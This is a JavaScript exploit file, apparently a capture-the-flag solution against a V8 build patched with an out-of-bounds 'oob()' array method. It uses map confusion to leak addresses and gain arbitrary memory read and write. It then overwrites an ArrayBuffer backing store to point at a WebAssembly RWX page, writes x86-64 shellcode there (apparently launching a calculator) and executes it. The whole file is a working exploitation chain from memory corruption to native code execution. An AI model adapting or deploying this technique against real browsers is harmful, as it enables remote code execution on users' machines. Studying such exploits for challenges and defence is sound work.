//fulfill
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}
function debug(){
    console.log("debug...");
    readline();
}
function gc(){
    for(var i=0;i<0x10;i++){
        new ArrayBuffer(0x1000000);
    }
}
function fail(str){
    console.log("FAIL:",str);
    throw null;
}

//trigger patch
var array1 = new Array(10);
//%DebugPrint(array1);
var obj1 = {a:1,b:2};

var array2 = new Array(10);
var obj2 = new Array(10);

var obj1_map=array1.oob();
var obj2_map=array2.oob();
//%DebugPrint(obj1);
//%DebugPrint(obj2);

array2.oob(obj1_map);
obj2.a=0x100;   //obj2.size
array2.oob(obj2_map);

obj2[0]=1.1; //make obj2 a float array
var exp_array = new Array(10);
exp_array[0]=1.1; //make exp a float array
exp_array[1]=1.2;
leak_exp_addr=obj2[19].f2i()-0x1n;   //elements of exp 
//%DebugPrint(exp);
console.log("[*] leak_exp_addr: ",leak_exp_addr.hex());

function read64(leak_addr) {
    //%SystemBreak();
    obj2[19]=(leak_addr+1n-0x10n).i2f();
    //%SystemBreak();
    return exp_array[0].f2i()
}

function write64(addr,data){
    obj2[19]=(addr+1n-0x10n).i2f();
    exp_array[0]=data.i2f();
}

// wasm -> shellcode
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module, {});
var f = wasm_instance.exports.main;
//%DebugPrint(f);
array1[0] = f;
console.log("[*] leak wasm addr in : " + (leak_exp_addr-0x358n).hex());
var f_addr = read64(leak_exp_addr-0x358n)-0x1n;
console.log("[*] leak wasm addr: " + f_addr.hex());
//%SystemBreak();
var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
console.log("[*] leak rwx_page_addr: " + rwx_page_addr.hex());

var shellcode =[0x010101010101b848n, 0x68632eb848500101n, 0x0431480169722e6fn, 0x0cfe016ae7894824n, 0x63782f6e69b84824n, 0x3b30b84850636c61n, 0x4850622f7273752fn, 0x303a3d59414c50b8n, 0x74726f70b848502en, 0x01b8485053494420n, 0x5001010101010101n, 0x01622c016972b848n, 0xf631240431487964n, 0x56e601485e0e6a56n, 0x6a56e601485e136an, 0x894856e601485e18n, 0x050f583b6ad231e6n]

var data_buf = new ArrayBuffer(0xa0);
var data_view = new DataView(data_buf);
array1[0] = data_buf;
var buf_backing_store_addr = read64(leak_exp_addr-0x358n)-0x1n + 0x20n;
write64(buf_backing_store_addr, rwx_page_addr);  
for (var i = 0; i < shellcode.length; i++) {
    data_view.setFloat64(i*8, shellcode[i].i2f(), true);
}
f();